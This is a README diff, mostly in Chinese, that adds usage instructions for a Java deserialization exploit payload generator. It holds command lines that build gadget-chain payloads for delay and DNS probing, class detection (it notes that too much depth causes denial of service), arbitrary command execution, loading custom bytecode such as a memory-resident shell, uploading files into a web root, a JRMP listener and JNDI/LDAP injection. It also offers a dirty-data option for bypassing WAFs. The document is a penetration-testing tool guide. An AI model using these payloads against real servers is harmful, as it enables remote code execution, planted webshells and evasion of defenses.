@@ -9,8 +9,79 @@ Requires Java 1.7+ and Maven 3.x+
 ```
 mvn clean package -DskipTests
 ```
+## 0x03 简单使用
 
-## 0x03 功能
+```
+usage: ysoserial-for-woodpecker-<version>.jar [-a <arg>] [-c] [-ddl <arg>]
+       [-g <arg>] [-l]
+ -a,--args <arg>                 gadget parameters
+ -c,--compress                   Zip the Templates gadgets
+ -ddl,--dirt-data-length <arg>   Add the length of dirty data, used to
+                                 bypass WAF
+ -g,--gadget <arg>               java deserialization gadget
+ -l,--list                       List all gadgets
+```
+
+
+#### 3.1 延时探测
+```
+java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "sleep:10"
+```
+#### 3.2 dns探测
+```
+java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "dnslog:xxx.dnslog.cn"
+```
+
+#### 3.3 DNS探测class
+```
+java -jar ysoserial-for-woodpecker-<version>.jar -g FindClassByDNS -a "http://string.dnslog.cn|java.lang.String"
+```
+
+#### 3.4 延时探测class
+注意设置深度，经过实战深度一般在25-28之间，太大会导致dos。
+
+```
+java -jar ysoserial-for-woodpecker-<version>.jar -g FindClassByBomb -a "java.lang.String|28"
+```
+
+#### 3.5 执行命令
+
+```
+java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "raw_cmd:calc.exe"
+```
+
+#### 3.6 执行自定义字节码
+
+```
+java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "class_file:/tmp/memshell.class"
+```
+
+#### 3.7 上传文件
+
+```
+java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "upload_file:/tmp/local_file.txt|/var/www/remote_file.txt"
+```
+
+#### 3.8 执行js
+
+```
+java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "script_file:/tmp/sleep.js"
+```
+
+#### 3.9 JRMP
+
+```
+java -cp ysoserial-for-woodpecker-<version>.jar me.gv7.woodpecker.yso.exploit.JRMPListener 1234 CommonsCollections6Lite "raw_cmd:calc.exe"
+```
+
+#### 3.10 JNDI
+
+```
+java -jar ysoserial-for-woodpecker-<version>.jar -g Spring3 -a "jndi:ldap://127.0.0.1:1089/obj"
+```
+
+更多功能移步`0x04 更多功能命令`
+## 0x04 更多功能命令
 - [ ] sleep 生成延时payload
 - [ ] dnslog 生成dnslog payload
 - [ ] httplog 生成httplog payload
